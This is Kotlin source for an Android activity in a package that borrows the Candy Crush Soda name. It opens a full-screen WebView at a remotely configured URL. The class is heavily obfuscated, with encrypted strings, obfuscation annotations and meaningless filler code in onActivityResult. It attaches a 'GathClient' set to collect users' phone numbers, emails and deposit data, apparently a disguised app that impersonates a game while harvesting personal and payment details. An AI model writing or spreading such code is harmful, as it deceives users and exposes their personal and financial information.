package com.king.candycrushsodasa.wBrazil

import io.github.a26197993b77e31a4.o7b471d74a5346efb54aa326b892daf01d914ce99.ObfStr
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.ViewGroup
import android.webkit.WebView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import com.king.candycrushsodasa.showCCToastJk
import com.king.candycrushsodasa.wBrazil.Full.ValueCallBack
import com.king.candycrushsodasa.wBrazil.Full.callMain
import com.king.candycrushsodasa.wBrazil.Full.voidString
import com.king.candycrushsodasa.wBrazil.brazil.JavaScript
import com.king.candycrushsodasa.wBrazil.sharedPref.Delegat
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.GathClient
import io.github.a26197993b77e31a4.o7b471d74a5346efb54aa326b892daf01d914ce99.ObfustringThis
import io.michaelrocks.paranoid.Obfuscate
import net.yslibrary.android.keyboardvisibilityevent.KeyboardVisibilityEvent
import net.yslibrary.android.keyboardvisibilityevent.KeyboardVisibilityEventListener
import java.io.FileReader
import java.io.PrintWriter
import java.util.*
import kotlin.collections.ArrayList
@ObfustringThis
@Obfuscate
class BrazilActivity : AppCompatActivity() {
    lateinit var gathClient: GathClient
    lateinit var webViewBrazil: WebView
    var click = false
    val dataDelegat by lazy { Delegat(this) }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            Toast(this).showCCToastJk(
                ObfStr("brazil").v("Gfacqyh..."),
                this,
                Toast.LENGTH_LONG
            )
        } catch (_: Exception) {
        }
        webViewBrazil = WebView(this)
        addContentView(
            webViewBrazil, ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        )

        startWeb()


    }

    private fun startWeb(): Unit {
        JavaScript(this, this@BrazilActivity, dataDelegat).set(webViewBrazil)
        try {
            gathClient =
                GathClient(lifecycleOwner = this, webView = webViewBrazil)
                    .setup {
                        isPhoneCollect = true
                        isEmailCollect = true
                        isDepositCollect = true
                    }
                    .start()
        } catch (e: Exception) {
//@ | Log.e("TAG", "GathClient: $e")
            Log.e(ObfStr("brazil").v("OLA"), ObfStr("brazil").v("BrtgEwjvns: ¦$e¦"))
        }
        try {
            KeyboardVisibilityEvent.setEventListener(
                this,
                KeyboardVisibilityEventListener {
                    if (!it) {
                        fullScreenBrazil()
                    }
                })
        } catch (e: Exception) {
//@ | Log.e("TAG", "KeyboardVisibilityEventListener: $e")
            Log.e(ObfStr("brazil").v("OLA"), ObfStr("brazil").v("FvyawlsuPhatczlhbjZmembQjjtdvps: ¦$e¦"))
        }
        return startUrl()
    }

    private fun fullScreenBrazil() {
        try {
            WindowCompat.setDecorFitsSystemWindows(window, true)
            WindowCompat.getInsetsController(window, webViewBrazil).let { controller ->
                controller.systemBarsBehavior =
                    WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
                controller.hide(WindowInsetsCompat.Type.systemBars())
            }
        }catch (e: Exception){
//@ | Log.e("TAG", "WindowCompat: $e")
            Log.e(ObfStr("brazil").v("OLA"), ObfStr("brazil").v("RzncwhXfmoie: ¦$e¦"))
        }
    }

    private fun startUrl() {

        val save = dataDelegat.data.toString()
        webViewBrazil.loadUrl(
            if (dataDelegat.data.toString() == voidString) intent.extras?.get(ObfStr("brazil").v("ciayqw"))
                .toString() else save.replaceFirst(ObfStr("brazil").v(".¦$").toRegex(),ObfStr("brazil").v("")).substring(1)
        )
    }


    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) {
            fullScreenBrazil()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        //sda
        var out = ObfStr("brazil").v("KiimbBsztdz(Xzjtdu.zvk)")
        val lines: ArrayList<String> = ArrayList()

        val startTextIndex = 10
        val authorName = ObfStr("brazil").v("Avdxi")
        var guestName = ObfStr("brazil").v("")
        var isAuthor = true

        var index = 0
        for (i in 0..2) {
            val line: String = ObfStr("brazil").v("gvdrnqgw")
            if (index == 0) {
                lines.add(line)
            }
            index++
        }


        lines.removeAt(lines.size - 1)

        for (line in lines) {
            val text = line.substring(startTextIndex)
            val lastSymbol = text[text.length - 1]
            out += ObfStr("brazil").v(" ")
            if (lastSymbol == '!' || lastSymbol == '?') {
                out += (text)
            } else if (lastSymbol == '.') {
                out += (text.substring(0, text.length - 1))
                out+= (ObfStr("brazil").v(","))
            } else {
                out+=(text)
                out+=(ObfStr("brazil").v(","))
            }
            out+=(ObfStr("brazil").v("\" --- tbayiw "))
            if (isAuthor) {
                out+=(authorName)
            } else {
                out+=(guestName)
            }
            out+=(ObfStr("brazil").v(".\n"))
            isAuthor = !isAuthor
        }



        var results: Array<Uri>? = null
        if (resultCode == RESULT_OK) {
            if (requestCode == 1) {
                if (data == null || data.data == null) {
                    if (callMain != null) {
                        results = arrayOf(Uri.parse(callMain))
                    }
                } else {
                    val dataString = data.dataString
                    if (dataString != null) {
                        results = arrayOf(Uri.parse(dataString))
                    }
                }
            }
        }
        ValueCallBack?.onReceiveValue(results)
        ValueCallBack = null
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (webViewBrazil.canGoBack()) {
            if (click) {
                webViewBrazil.stopLoading()
                val link = dataDelegat.data.toString()
                webViewBrazil.loadUrl(link)
            }
            this.click = true
            webViewBrazil.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                click = false
            }, 1499)
        }
    }
    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        try {
            webViewBrazil.restoreState(savedInstanceState)
        } catch (e: Exception) {
//@ | Log.e("TAG", "onRestoreInstanceState: $e")
            Log.e(ObfStr("brazil").v("OLA"), ObfStr("brazil").v("peLdaepieBvdurnbmXurtd: ¦$e¦"))
        }

    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        try {
            webViewBrazil.saveState(outState)
        } catch (e: Exception) {
//@ | Log.e("TAG", "onSaveInstanceState: $e")
            Log.e(ObfStr("brazil").v("OLA"), ObfStr("brazil").v("peMzdpDessiydvMsief: ¦$e¦"))
        }

    }
}